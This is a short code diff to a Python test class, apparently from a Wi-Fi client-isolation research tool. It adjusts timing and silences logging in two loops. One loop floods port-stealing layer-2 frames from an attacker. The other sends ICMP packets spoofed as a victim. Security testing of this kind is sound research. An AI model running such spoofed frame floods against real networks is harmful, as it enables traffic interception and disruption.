@@ -842,8 +842,8 @@ class Client2Client:
 			for _ in range(1000000):
 				if self.attacker_connected:
 					self.sup_attacker.send_eth(p)
-					log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
-				time.sleep(0.05)
+					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
+				time.sleep(0.001)
 			log(STATUS, f"Finished sending 1000000 frames.")
 
 		# Option four: test port stealing (uplink) by letting the attacker send a lot of layer-2 frames with src addr as the victim's gateway. 
@@ -914,9 +914,9 @@ class Client2Client:
 			for _ in range(500000):
 				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
-				log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
+				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
-				time.sleep(0.001)
+				time.sleep(0.02)
 				# self.sup_victim.send_tcp_syn()
 
 	def send_uplink_frame2(self):
